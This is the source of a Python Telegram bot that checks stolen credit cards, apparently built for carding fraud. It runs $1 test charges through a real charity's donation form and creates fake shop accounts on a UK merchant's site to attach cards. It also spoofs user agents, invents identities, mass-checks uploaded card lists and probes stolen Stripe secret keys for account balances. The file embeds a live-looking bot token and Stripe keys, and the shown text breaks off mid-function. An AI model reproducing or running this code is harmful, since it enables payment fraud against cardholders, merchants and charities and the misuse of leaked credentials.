#!/usr/bin/env python
import logging
import requests
import asyncio
import re
import json
import os
import random
import time
import uuid
import urllib.parse
import hmac
import hashlib
import base64
from datetime import datetime
from fake_useragent import UserAgent
import aiohttp
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from flask import Flask
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Initialize Flask app
app = Flask(__name__)

# Bot token
BOT_TOKEN = "7646562599:AAFxT8lHyAN7kjxQN737UA1diilkC6v3ai4"

# API Constants
STRIPE_PK = "pk_live_sd4VzXOpmDU8DIdWT77qHT1q"
RANDOM_USER_API = "https://randomuser.me/api/?nat=us"
BIN_CHECKER_API = "https://bins.antipublic.cc/bins/"
STRIPE_KEY = "pk_live_51PGzH0CHkCOwzzTu9c6qvusREh4UxRGjldkEitLYyhxzMrXky5loofeHZrMni5bXOG7oTHvJ0eOImw9vlFTRRVjR009dFq9WHT"

# Global variables with thread-safe storage
USER_SESSIONS = {}  # Stores user-specific check data
ACTIVE_CHECKS = {}  # Tracks active checks per user

# Thread pool for parallel processing
CHECK_EXECUTOR = ThreadPoolExecutor(max_workers=50)  # Increased worker count

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

class CardChecker:
    @staticmethod
    async def check_bin(bin_number: str) -> dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{BIN_CHECKER_API}{bin_number}") as response:
                    return await response.json()
        except Exception as e:
            logger.error(f"BIN check error: {str(e)}")
            return None

    @staticmethod
    async def get_stripe_token(number: str, month: str, year: str, cvc: str) -> str:
        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'User-Agent': UserAgent().random,
            'sec-ch-ua': '"Chromium";v="91", " Not;A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site'
        }
        data = {
            'card[number]': number,
            'card[cvc]': cvc,
            'card[exp_month]': month,
            'card[exp_year]': year,
            'payment_user_agent': 'stripe.js/7fa1d9b9; stripe-js-v3/7fa1d9b9',
            'time_on_page': '60914',
            'key': STRIPE_PK
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post('https://api.stripe.com/v1/tokens', headers=headers, data=data) as response:
                    if response.ok:
                        data = await response.json()
                        return data.get('id')
                    return None
        except Exception as e:
            logger.error(f"Stripe token error: {str(e)}")
            return None

    @staticmethod
    async def process_payment(token: str, first_name: str, last_name: str) -> dict:
        headers = {
            'Accept': '*/*',
            'Content-Type': 'application/json',
            'Origin': 'https://rhcollaborative.org',
            'User-Agent': UserAgent().random
        }
        params = {
            'account_id': 'act_f5d15c354806',
            'donation_type': 'cc',
            'amount_in_cents': '100',
            'form_id': 'frm_3fe8af6a5f28',
        }
        json_data = {
            'first_name': first_name,
            'last_name': last_name,
            'email': f"{first_name.lower()}{last_name.lower()}@gmail.com",
            'payment_auth': '{"stripe_token":"' + token + '"}',
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post('https://api.donately.com/v2/donations', 
                                     params=params, headers=headers, json=json_data) as response:
                    return await response.json()
        except Exception as e:
            logger.error(f"Payment processing error: {str(e)}")
            return {'error': str(e)}

    @staticmethod
    async def visit_website(cc_number, exp_month, exp_year, cvc):
        try:
            async with aiohttp.ClientSession() as session:
                # Generate random user credentials
                user_id = random.randint(9999, 574545)
                username = f"cristnik1{user_id}"
                email = f"cristnik1{user_id}@mml.com"

                # First request to get register nonce
                headers = {
                    'User-Agent': UserAgent().random,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1',
                    'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                }

                async with session.get('https://fbsdoors.co.uk/my-account/', headers=headers) as response:
                    response_text = await response.text()
                    register_nonce = gets(response_text, '<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" />')

                    # Register the user
                    headers = {
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Cache-Control': 'max-age=0',
                        'Connection': 'keep-alive',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': 'https://fbsdoors.co.uk',
                        'Referer': 'https://fbsdoors.co.uk/my-account/',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'same-origin',
                        'Sec-Fetch-User': '?1',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': UserAgent().random,
                        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                    }

                    data = {
                        'email': email,
                        'email_2': '',
                        'mailchimp_woocommerce_newsletter': '1',
                        'wc_order_attribution_source_type': 'typein',
                        'wc_order_attribution_referrer': '(none)',
                        'wc_order_attribution_utm_campaign': '(none)',
                        'wc_order_attribution_utm_source': '(direct)',
                        'wc_order_attribution_utm_medium': '(none)',
                        'wc_order_attribution_utm_content': '(none)',
                        'wc_order_attribution_utm_id': '(none)',
                        'wc_order_attribution_utm_term': '(none)',
                        'wc_order_attribution_utm_source_platform': '(none)',
                        'wc_order_attribution_utm_creative_format': '(none)',
                        'wc_order_attribution_utm_marketing_tactic': '(none)',
                        'wc_order_attribution_session_entry': 'https://fbsdoors.co.uk/my-account/',
                        'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'wc_order_attribution_session_pages': '4',
                        'wc_order_attribution_session_count': '3',
                        'wc_order_attribution_user_agent': UserAgent().random,
                        'woocommerce-register-nonce': register_nonce,
                        '_wp_http_referer': '/my-account/',
                        'register': 'Register',
                    }

                    await session.post('https://fbsdoors.co.uk/my-account/', headers=headers, data=data)

                    # Get payment methods page
                    headers = {
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Connection': 'keep-alive',
                        'Referer': 'https://fbsdoors.co.uk/my-account/',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'same-origin',
                        'Sec-Fetch-User': '?1',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': UserAgent().random,
                        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                    }

                    async with session.get('https://fbsdoors.co.uk/my-account/payment-methods/', headers=headers) as response:
                        payment_page_text = await response.text()
                        add_card_nonce = gets(payment_page_text, 'add_card_nonce":"', '"')

                        # Create payment method with Stripe
                        headers = {
                            'Accept': 'application/json',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'Connection': 'keep-alive',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Origin': 'https://js.stripe.com',
                            'Referer': 'https://js.stripe.com/',
                            'Sec-Fetch-Dest': 'empty',
                            'Sec-Fetch-Mode': 'cors',
                            'Sec-Fetch-Site': 'same-site',
                            'User-Agent': UserAgent().random,
                            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                        }

                        data = {
                            'type': 'card',
                            'billing_details[name]': 'wilam ougth',
                            'billing_details[email]': email,
                            'card[number]': cc_number,
                            'card[cvc]': cvc,
                            'card[exp_month]': exp_month,
                            'card[exp_year]': exp_year,
                            'guid': str(uuid.uuid4()),
                            'muid': str(uuid.uuid4()),
                            'sid': str(uuid.uuid4()),
                            'payment_user_agent': 'stripe.js/5d3c74e219; stripe-js-v3/5d3c74e219; split-card-element',
                            'referrer': 'https://fbsdoors.co.uk',
                            'time_on_page': str(random.randint(100000, 999999)),
                            'key': STRIPE_KEY,
                        }

                        async with session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data) as response:
                            response_json = await response.json()
                            if 'id' in response_json:
                                payment_method_id = response_json['id']

                                # Finalize the setup
                                headers = {
                                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                                    'Accept-Language': 'en-US,en;q=0.9',
                                    'Connection': 'keep-alive',
                                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                                    'Origin': 'https://fbsdoors.co.uk',
                                    'Referer': 'https://fbsdoors.co.uk/my-account/add-payment-method/',
                                    'Sec-Fetch-Dest': 'empty',
                                    'Sec-Fetch-Mode': 'cors',
                                    'Sec-Fetch-Site': 'same-origin',
                                    'User-Agent': UserAgent().random,
                                    'X-Requested-With': 'XMLHttpRequest',
                                    'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                                    'sec-ch-ua-mobile': '?0',
                                    'sec-ch-ua-platform': '"Windows"',
                                }

                                params = {
                                    'wc-ajax': 'wc_stripe_create_setup_intent',
                                }

                                data = {
                                    'stripe_source_id': payment_method_id,
                                    'nonce': add_card_nonce,
                                }

                                async with session.post('https://fbsdoors.co.uk/', params=params, headers=headers, data=data) as final_response:
                                    final_text = await final_response.text()
                                    if '"result":"success"' in final_text.lower():
                                        return {
                                            'status': 'success',
                                            'message': 'Card successfully validated',
                                            'card': f'{cc_number[:6]}******{cc_number[-4:]}',
                                            'expiry': f'{exp_month}/{exp_year}',
                                            'brand': response_json.get('card', {}).get('brand', 'Unknown'),
                                            'country': response_json.get('card', {}).get('country', 'Unknown')
                                        }
                                    else:
                                        error_msg = gets(final_text, '"message":"', '"') or final_text[:200]
                                        return {
                                            'status': 'failed',
                                            'message': error_msg,
                                            'card': f'{cc_number[:6]}******{cc_number[-4:]}',
                                            'expiry': f'{exp_month}/{exp_year}'
                                        }
                            else:
                                error_msg = response_json.get('error', {}).get('message', 'Unknown error')
                                return {
                                    'status': 'failed',
                                    'message': error_msg,
                                    'card': f'{cc_number[:6]}******{cc_number[-4:]}',
                                    'expiry': f'{exp_month}/{exp_year}'
                                }
        except Exception as e:
            logger.error(f"Website visit error: {str(e)}")
            return {
                'status': 'error',
                'message': str(e),
                'card': f'{cc_number[:6]}******{cc_number[-4:]}' if cc_number else 'N/A',
                'expiry': f'{exp_month}/{exp_year}' if exp_month and exp_year else 'N/A'
            }

class Commands:
    @staticmethod
    async def is_registered(user_id: int) -> bool:
        try:
            with open('registered_users.txt', 'r') as f:
                registered_users = f.read().splitlines()
                return str(user_id) in registered_users
        except FileNotFoundError:
            return False

    @staticmethod
    async def register_user(user_id: int) -> None:
        with open('registered_users.txt', 'a') as f:
            f.write(f"{user_id}\n")

    @staticmethod
    async def register_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if await Commands.is_registered(user_id):
            await update.message.reply_text("You are already registered! ✅")
            return

        await Commands.register_user(user_id)
        await update.message.reply_text(
            "✅ Registration successful!\n"
            "You can now use all bot features.\n"
            "Type /start to begin!"
        )

    @staticmethod
    async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if not await Commands.is_registered(user_id):
            await update.message.reply_text(
                "❗️ You need to register first to use this bot!\n"
                "Send /register to register."
            )
            return

        keyboard = [
            [InlineKeyboardButton("Commands List 📋", callback_data='cmds')],
            [InlineKeyboardButton("Generate Random User 👤", callback_data='random_user')],
            [InlineKeyboardButton("Check Cards 💳", callback_data='cards')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "Welcome to the Multi-Purpose Bot!\n"
            "Created by @mumirudarkside\n"
            "Join: https://t.me/addlist/CdzXIdzTkZc4ZjNl",
            reply_markup=reply_markup
        )

    @staticmethod
    async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        keyboard = [
            [InlineKeyboardButton("Stripe", callback_data='stripe')],
            [InlineKeyboardButton("Other Options", callback_data='other')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        msg = update.callback_query.message if update.callback_query else update.message
        await msg.reply_text('Please choose an option:', reply_markup=reply_markup)

    @staticmethod
    async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        query = update.callback_query
        await query.answer()

        if query.data == 'random_user':
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(RANDOM_USER_API) as response:
                        data = (await response.json())['results'][0]
                        user_info = f"""👤 Random User Generated:
▬▬▬▬▬▬▬▬
📛 Name: {data['name']['first']} {data['name']['last']}
📧 Email: {data['email']}
📱 Phone: {data['phone']}
📍 Location: {data['location']['city']}, {data['location']['state']}
🏠 Address: {data['location']['street']['number']} {data['location']['street']['name']}
📮 Postcode: {data['location']['postcode']}
🎂 DOB: {data['dob']['date'].split('T')[0]}
🆔 Username: {data['login']['username']}
🔑 Password: {data['login']['password']}"""

                        keyboard = [
                            [InlineKeyboardButton("🔄 Generate Another", callback_data='random_user')],
                            [InlineKeyboardButton("⬅️ Back", callback_data='back')],
                            [InlineKeyboardButton("❌ Close", callback_data='close')]
                        ]
                        reply_markup = InlineKeyboardMarkup(keyboard)
                        await query.edit_message_text(text=user_info, reply_markup=reply_markup)
            except Exception as e:
                await query.edit_message_text(f"Error generating random user: {str(e)}")

        elif query.data == 'stripe':
            keyboard = [
                [InlineKeyboardButton("⬅️ Back", callback_data='back')],
                [InlineKeyboardButton("❌ Close", callback_data='close')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            response_text = (
                "》/svv - SK Based 1$ | [On ✅]\n"
                "》/msvv - SK Based Mass 1$ | [off ❌]\n"
                "》/st - stripe 1$ check [On ✅]\n"
                "》/mst - mass check stripe 1$ [On ✅]\n"
                "》/sk - Check Stripe Key [On ✅]\n"
                "》/stt - SK auth check | [On ✅]\n"
                "》/mstt - Stripe auth mass Check [On ✅]\n"
            )
            await query.edit_message_text(text=response_text, reply_markup=reply_markup)
        elif query.data == 'cmds':
            keyboard = [
                [InlineKeyboardButton("Stripe", callback_data='stripe')],
                [InlineKeyboardButton("Other Options", callback_data='other')],
                [InlineKeyboardButton("❌ Close", callback_data='close')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text('Please choose an option:', reply_markup=reply_markup)
        elif query.data == 'close':
            particle_msg = "❄️ ⭐️ 💫 ✨ 🌟\n   Goodbye!\n❄️ ⭐️ 💫 ✨ 🌟"
            await query.edit_message_text(text=particle_msg)
            await asyncio.sleep(1)
            await query.message.delete()
        elif query.data == 'back':
            keyboard = [
                [InlineKeyboardButton("Commands List 📋", callback_data='cmds')],
                [InlineKeyboardButton("Generate Random User 👤", callback_data='random_user')],
                [InlineKeyboardButton("❌ Close", callback_data='close')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                text="Welcome to the Makima cc checker  Bot!\n"
                     "Created by @mumirudarkside\n"
                     "Join: https://t.me/addlist/CdzXIdzTkZc4ZjNl",
                reply_markup=reply_markup
            )

    @staticmethod
    async def generate_random_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(RANDOM_USER_API) as response:
                    data = (await response.json())['results'][0]

                    user_info = f"""👤 Random User Generated:
▬▬▬▬▬▬▬▬
📛 Name: {data['name']['first']} {data['name']['last']}
📧 Email: {data['email']}
📱 Phone: {data['phone']}
📍 Location: {data['location']['city']}, {data['location']['state']}
🏠 Address: {data['location']['street']['number']} {data['location']['street']['name']}
📮 Postcode: {data['location']['postcode']}
🎂 DOB: {data['dob']['date'].split('T')[0]}
🆔 Username: {data['login']['username']}
🔑 Password: {data['login']['password']}"""

                    msg = update.callback_query.message if update.callback_query else update.message
                    await msg.reply_text(user_info)
        except Exception as e:
            error_msg = f"Error generating random user: {str(e)}"
            msg = update.callback_query.message if update.callback_query else update.message
            await msg.reply_text(error_msg)

    @staticmethod
    async def check_sk(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if not context.args:
            await update.message.reply_text("Please provide SK key")
            return

        sk_key = context.args[0]
        if not re.match(r"sk_(test|live)_[A-Za-z0-9]+", sk_key):
            await update.message.reply_text("[❌] Error → Invalid SK Key format!")
            return

        try:
            auth = base64.b64encode(sk_key.encode()).decode()
            headers = {'Authorization': f'Basic {auth}', 'User-Agent': UserAgent().random}

            async with aiohttp.ClientSession() as session:
                # Get balance info
                async with session.get('https://api.stripe.com/v1/balance', headers=headers) as balance_response:
                    balance_data = await balance_response.json()

                # Get account info
                async with session.get('https://api.stripe.com/v1/account', headers=headers) as account_response:
                    account_data = await account_response.json()

                if 'error' in balance_data or 'error' in account_data:
                    error_msg = balance_data.get('error', {}).get('message') or account_data.get('error', {}).get('message', 'Invalid SK Key')
                    await update.message.reply_text(f"[❌] Error → {error_msg}")
                    return

                masked_sk = sk_key[:12] + '_SWDQYL_' + sk_key[-4:]

                msg = f"""━━━━━━━━━━━━━━━  
   𝙎𝙩𝙖𝙩𝙪𝙨 ⌁  
━━━━━━━━━━━━━━━  

🚀 𝙎𝙠 ⌁ {masked_sk}

🆔 𝙉𝙖𝙢𝙚: {account_data.get('business_profile', {}).get('name', 'N/A')}
🌍 𝙎𝙞𝙩𝙚: {account_data.get('business_profile', {}).get('url', 'N/A')}
🔢 𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙄𝘿: {account_data.get('id', 'N/A')}
🏳️ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮: {account_data.get('country', 'N/A')}
💰 𝘾𝙪𝙧𝙧𝙚𝙣𝙘𝙮: {balance_data['available'][0]['currency'].upper() if balance_data.get('available') else 'N/A'}
📧 𝙈𝙖𝙞𝙡: {account_data.get('email', 'N/A')}

💳 𝘼𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 𝘽𝙖𝙡𝙖𝙣𝙘𝙚: {balance_data['available'][0]['amount'] if balance_data.get('available') else 'N/A'}
⏳ 𝙋𝙚𝙣𝙙𝙞𝙣𝙜: {balance_data['pending'][0]['amount'] if balance_data.get('pending') else 'N/A'}

🔹 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙈𝙚𝙩𝙝𝙤𝙙 𝙎𝙩𝙖𝙩𝙪𝙨: {'✅ Active' if account_data.get('capabilities', {}).get('card_payments') == 'active' else '❌ Inactive'}
🔹 𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙎𝙩𝙖𝙩𝙪𝙨: {'✅ Active' if account_data.get('charges_enabled') else '❌ Inactive'}
🔹 𝘾𝙝𝙖𝙧𝙜𝙚𝙨 𝙀𝙣𝙖𝙗𝙡𝙚𝙙: {'✅ Yes' if account_data.get('charges_enabled') else '❌ No'}

━━━━━━━━━━━━━━━ 
𝗥𝗲𝗾 𝗯𝘆 ➜ @{update.effective_user.username or 'N/A'}
━━━━━━━━━━━━━━━"""

                await update.message.reply_text(msg)
        except Exception as e:
            await update.message.reply_text(f"[❌] Error → {str(e)}")

    @staticmethod
    async def check_card(cc_data: str, update: Update) -> str:
        try:
            number, month, year, cvc = cc_data.split("|")
            
            # Get random user data for the transaction
            async with aiohttp.ClientSession() as session:
                async with session.get(RANDOM_USER_API) as response:
                    user_data = (await response.json())['results'][0]
                    first_name = user_data['name']['first']
                    last_name = user_data['name']['last']

            # Get Stripe token
            stripe_token = await CardChecker.get_stripe_token(number, month, year, cvc)
            if not stripe_token:
                return "❌ Error: Could not get token"

            # Process payment
            payment_result = await CardChecker.process_payment(stripe_token, first_name, last_name)
            result = payment_result.get('message', 'Unknown response')
            
            # Get BIN info
            bin_info = await CardChecker.check_bin(number[:6])

            # Format response
            response = f"""━━━━━━━━━━━━━━━
📌 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 🔥
━━━━━━━━━━━━━━━

💳 𝗖𝗮𝗿𝗱 ➜ {number}|{month}|{year}|{cvc}
🚪 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ Stripe 1$
📡 𝗦𝘁𝗮𝘁𝘂𝘀 ➜ {'✅' if 'success' in str(result).lower() else '❌'}
⚡ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result}

━━━━━━━━━━━━━━━"""

            if bin_info:
                response += f"""
━━━━━━━━━━━━━━━
𝗕𝗶𝗻 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻
━━━━━━━━━━━━━━━

🔍 𝗕𝗶𝗻 ➜ {number[:6]}
🏷️ 𝗕𝗿𝗮𝗻𝗱 ➜ {bin_info.get('brand', 'N/A')}
🌍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➜ {bin_info.get('country_code', 'N/A')}
🇨🇴 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 𝗡𝗮𝗺𝗲 ➜ {bin_info.get('country_name', 'N/A')}
🏦 𝗕𝗮𝗻𝗸 ➜ {bin_info.get('bank', 'N/A')}
📶 𝗟𝗲𝘃𝗲𝗹 ➜ {bin_info.get('level', 'N/A')}
📌 𝗧𝘆𝗽𝗲 ➜ {bin_info.get('type', 'N/A')}

━━━━━━━━━━━━━━━
𝗥𝗲𝗾 ⌁ @{update.effective_user.username or 'N/A'}
𝗗𝗲𝘃𝗕𝘆 ⌁ @mumiru
━━━━━━━━━━━━━━━"""

            return response

        except Exception as e:
            return f"Error: {str(e)}"

    @staticmethod
    async def st_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if not context.args:
            await update.message.reply_text("Please provide card details in format: number|month|year|cvc")
            return

        cc_data = context.args[0]
        
        # Send initial processing message
        processing_msg = await update.message.reply_text("🔄 Processing your card, please wait...")
        
        # Run the check in a separate thread
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(CHECK_EXECUTOR, lambda: asyncio.run(Commands.check_card(cc_data, update)))
        
        # Edit the original message with results
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=processing_msg.message_id,
            text=result
        )

    @staticmethod
    async def validate_card(cc_data: str) -> tuple:
        try:
            parts = cc_data.strip().split("|")
            if len(parts) != 4:
                return False, "Invalid format"

            number, month, year, cvc = parts
            number = number.strip()
            month = month.strip()
            year = year.strip()
            cvc = cvc.strip()

            if not all(part.isdigit() for part in [number, month, year, cvc]):
                return False, "All parts must be numeric"

            if len(year) == 2:
                year = "20" + year

            if not (1 <= int(month) <= 12):
                return False, "Invalid month"

            if len(cvc) not in [3, 4]:
                return False, "Invalid CVC length"

            return True, (number, month, year, cvc)
        except Exception as e:
            return False, str(e)

    @staticmethod
    async def svv_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if not context.args:
            await update.message.reply_text("Please provide card details in format:\n/svv number|month|year|cvc")
            return

        cc_data = context.args[0]
        valid, result = await Commands.validate_card(cc_data)

        if not valid:
            await update.message.reply_text(f"❌ {result}")
            return

        context.user_data['pending_cc'] = cc_data
        await update.message.reply_text("💳 Card Received\n⌛ Please provide your SK key (starts with sk_live_)")

    @staticmethod
    async def validate_sk(sk: str) -> bool:
        return bool(re.match(r'^sk_live_[A-Za-z0-9]{24,}$', sk))

    @staticmethod
    async def process_stripe_payment(sk: str, number: str, month: str, year: str, cvc: str) -> dict:
        try:
            # Create payment method
            pm_data = {
                "type": "card",
                "card[number]": number,
                "card[exp_month]": month,
                "card[exp_year]": year,
                "card[cvc]": cvc
            }

            headers = {
                "Authorization": f"Bearer {sk}",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": UserAgent().random
            }

            async with aiohttp.ClientSession() as session:
                # Create payment method
                async with session.post(
                    "https://api.stripe.com/v1/payment_methods",
                    headers=headers,
                    data=pm_data
                ) as pm_response:
                    if not pm_response.ok:
                        error = await pm_response.json()
                        return {"success": False, "message": error.get("error", {}).get("message", "Payment method creation failed")}

                    pm_id = (await pm_response.json()).get("id")

                # Create payment intent
                pi_data = {
                    "amount": 100,
                    "currency": "usd",
                    "payment_method": pm_id,
                    "confirm": True,
                    "off_session": True
                }

                async with session.post(
                    "https://api.stripe.com/v1/payment_intents",
                    headers=headers,
                    data=pi_data
                ) as pi_response:
                    return {"success": True, "response": await pi_response.json()}

        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    async def handle_sk_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if 'pending_cc' not in context.user_data:
            return

        # Delete the SK message for security
        await update.message.delete()

        sk = update.message.text
        if not await Commands.validate_sk(sk):
            await update.message.reply_text("❌ Invalid SK key format!")
            return

        cc_data = context.user_data['pending_cc']
        del context.user_data['pending_cc']

        checking_message = await update.message.reply_text("⌛ Processing card...")

        try:
            number, month, year, cvc = cc_data.split("|")

            # Clean and validate the data
            number = number.strip()
            month = month.strip()
            year = year.strip()
            cvc = cvc.strip()

            if not all([number.isdigit(), month.isdigit(), year.isdigit(), cvc.isdigit()]):
                await checking_message.reply_text("❌ INVALID CARD FORMAT\n💳 " + cc_data)
                return

            # Ensure proper year format for Stripe API
            if len(year) == 2:
                year = "20" + year

            await checking_message.edit_text("⌛ Connecting to Stripe API...")
            
            # Run in executor to prevent blocking
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(
                CHECK_EXECUTOR,
                lambda: asyncio.run(Commands.process_stripe_payment(sk, number, month, year, cvc))
            )

            if not result["success"]:
                await checking_message.reply_text(f"❌ ERROR: {result['message']}\n💳 {cc_data}")
                return

            response = result["response"]

            if response.get("status") == "succeeded":
                msg = f"✅ APPROVED\n💳 {cc_data}\n💲 1$ CHARGED"
            elif response.get("error"):
                error = response["error"]
                code = error.get("decline_code", "").upper() or error.get("code", "").upper()

                if "insufficient_funds" in str(error):
                    msg = f"✅ INSUFFICIENT_FUNDS\n💳 {cc_data}"
                elif "security_code" in str(error):
                    msg = f"❌ INCORRECT_CVC\n💳 {cc_data}"
                elif "authentication_required" in str(error):
                    msg = f"❌ 3DS_REQUIRED\n💳 {cc_data}"
                else:
                    msg = f"❌ {code or 'DECLINED'}\n💳 {cc_data}"
            else:
                msg = f"❌ UNKNOWN ERROR\n💳 {cc_data}"

            await checking_message.reply_text(msg)

        except Exception as e:
            await checking_message.reply_text(f"❌ ERROR: {str(e)}\n💳 {cc_data}")

    @staticmethod
    async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if user_id in ACTIVE_CHECKS:
            ACTIVE_CHECKS[user_id] = False
            await update.message.reply_text("🛑 Mass checking operation stopped.")

    @staticmethod
    async def mst_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if not update.message.reply_to_message or not update.message.reply_to_message.document:
            await update.message.reply_text("Please reply to a file containing cards")
            return

        # Mark this user as active
        ACTIVE_CHECKS[user_id] = True
        
        # Initialize user session
        USER_SESSIONS[user_id] = {
            'approved': 0,
            'declined': 0,
            'checked': 0,
            'total': 0
        }

        # Download the file
        file = await update.message.reply_to_message.document.get_file()
        content = (await file.download_as_bytearray()).decode('utf-8')
        cards = [line.strip() for line in content.split('\n') if '|' in line.strip()]
        total_cards = len(cards)
        USER_SESSIONS[user_id]['total'] = total_cards

        # Create initial status message
        status_msg = await update.message.reply_text(
            f"Antico Cleaner\n"
            f"Total Filtered Cards: {total_cards}\n\n"
            f"Please Wait Checking Your Cards 🟢\n\n"
            f"Gate -> Stripe Auth 🟢\n\n"
            f"Programmer -> @OUT_MAN0000 {datetime.now().strftime('%I:%M %p')}\n\n"
            f"CC • \n\n"
            f"Status • \n\n"
            f"APPROVED !✔ • 0\n"
            f"DECLINED !✔ • 0\n"
            f"0 / {total_cards} •\n\n"
            f"Stop Check 🟢",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🛑 Stop Check", callback_data=f"stop_check_{user_id}")]
            ])
        )

        # Process cards asynchronously
        async def process_card(card):
            if not ACTIVE_CHECKS.get(user_id, True):
                return None
                
            try:
                number, month, year, cvc = card.split("|")
                
                # Get random user data for the transaction
                async with aiohttp.ClientSession() as session:
                    async with session.get(RANDOM_USER_API) as response:
                        user_data = (await response.json())['results'][0]
                        first_name = user_data['name']['first']
                        last_name = user_data['name']['last']

                # Get Stripe token
                stripe_token = await CardChecker.get_stripe_token(number, month, year, cvc)
                if not stripe_token:
                    return {'status': 'failed', 'message': 'Could not get token', 'card': card}

                # Process payment
                payment_result = await CardChecker.process_payment(stripe_token, first_name, last_name)
                result = payment_result.get('message', 'Unknown response')
                
                # Check for success keywords
                success_keywords = [
                    "succeeded", "success", "Thank you", "approved", "complete", 
                    "completed", "pass", "Thanks", "successful", "Saved payment method"
                ]
                
